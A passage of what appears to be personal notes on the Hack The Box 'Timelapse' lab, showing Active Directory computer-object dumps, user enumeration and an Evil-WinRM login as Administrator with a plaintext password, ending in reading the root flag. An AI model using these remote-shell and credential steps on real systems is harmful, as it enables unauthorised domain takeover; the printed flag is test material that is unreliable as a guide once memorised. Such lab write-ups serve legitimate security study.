PrincipalsAllowedToDelegateToAccount : {}
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902913288614
SamAccountName                       : DB01$
sAMAccountType                       : 805306369
sDRightsEffective                    : 0
ServiceAccount                       : {}
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1606
SIDHistory                           : {}
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 4128
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 12841
uSNCreated                           : 12837
whenChanged                          : 10/23/2021 12:18:11 PM
whenCreated                          : 10/23/2021 12:18:11 PM

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Servers/Web/WEB01
Certificates                         : {}
CN                                   : WEB01
codePage                             : 0
CompoundIdentitySupported            : {}
countryCode                          : 0
Created                              : 10/23/2021 12:18:17 PM
createTimeStamp                      : 10/23/2021 12:18:17 PM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=WEB01,OU=Web,OU=Servers,DC=timelapse,DC=htb
DNSHostName                          :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          :
IPv6Address                          :
isCriticalSystemObject               : False
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 0
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 10/23/2021 12:18:17 PM
modifyTimeStamp                      : 10/23/2021 12:18:17 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : WEB01
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : computer
ObjectGUID                           : 897c7cfe-ba15-4181-8f2c-a74f88952683
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1607
OperatingSystem                      :
OperatingSystemHotfix                :
OperatingSystemServicePack           :
OperatingSystemVersion               :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:18:17 PM
PasswordNeverExpires                 : False
PasswordNotRequired                  : True
PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 515
PrincipalsAllowedToDelegateToAccount : {}
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794902971507056
SamAccountName                       : WEB01$
sAMAccountType                       : 805306369
sDRightsEffective                    : 0
ServiceAccount                       : {}
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1607
SIDHistory                           : {}
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 4128
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 12847
uSNCreated                           : 12843
whenChanged                          : 10/23/2021 12:18:17 PM
whenCreated                          : 10/23/2021 12:18:17 PM

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Servers/Dev/DEV01
Certificates                         : {}
CN                                   : DEV01
codePage                             : 0
CompoundIdentitySupported            : {}
countryCode                          : 0
Created                              : 10/23/2021 12:18:23 PM
createTimeStamp                      : 10/23/2021 12:18:23 PM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DEV01,OU=Dev,OU=Servers,DC=timelapse,DC=htb
DNSHostName                          :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          :
IPv6Address                          :
isCriticalSystemObject               : False
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 0
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 10/23/2021 12:18:23 PM
modifyTimeStamp                      : 10/23/2021 12:18:23 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : DEV01
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : computer
ObjectGUID                           : 02dc961a-7a60-4ec0-a151-0472768814ca
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1608
OperatingSystem                      :
OperatingSystemHotfix                :
OperatingSystemServicePack           :
OperatingSystemVersion               :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:18:23 PM
PasswordNeverExpires                 : False
PasswordNotRequired                  : True
PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 515
PrincipalsAllowedToDelegateToAccount : {}
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 132794903036875725
SamAccountName                       : DEV01$
sAMAccountType                       : 805306369
sDRightsEffective                    : 0
ServiceAccount                       : {}
ServicePrincipalNames                : {}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1608
SIDHistory                           : {}
TrustedForDelegation                 : False
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 4128
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 12853
uSNCreated                           : 12849
whenChanged                          : 10/23/2021 12:18:23 PM
whenCreated                          : 10/23/2021 12:18:23 PM
```

```
net user
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

![[Pasted image 20230830182400.png]]

```
evil-winrm -i 10.129.227.113 -u Administrator -p 'rzXrevV%Hd8+K4hq[9Y{0H5Z' -S
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ evil-winrm -i 10.129.227.113 -u Administrator -p 'rzXrevV%Hd8+K4hq[9Y{0H5Z' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..\..\
*Evil-WinRM* PS C:\Users> dir *.txt
*Evil-WinRM* PS C:\Users> gci *.txt
*Evil-WinRM* PS C:\Users> gci


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> gci TRX


    Directory: C:\Users\TRX


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         3/3/2022  10:45 PM                3D Objects
d-r---         3/3/2022  10:45 PM                Contacts
d-r---         3/3/2022  10:45 PM                Desktop
d-r---         3/3/2022  10:45 PM                Documents
d-r---         3/3/2022  10:45 PM                Downloads
d-r---         3/3/2022  10:45 PM                Favorites
d-r---         3/3/2022  10:45 PM                Links
d-r---         3/3/2022  10:45 PM                Music
d-r---         3/3/2022  10:45 PM                Pictures
d-r---         3/3/2022  10:45 PM                Saved Games
d-r---         3/3/2022  10:45 PM                Searches
d-r---         3/3/2022  10:45 PM                Videos


*Evil-WinRM* PS C:\Users> gci TRX\Desktop


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/30/2023  12:11 AM             34 root.txt


*Evil-WinRM* PS C:\Users> type TRX\Desktop\root.txt
a43a10328c3d1c872d1b46ad6e2df7e1
```

```
a43a10328c3d1c872d1b46ad6e2df7e1
```

![[Pasted image 20230830184108.png]]
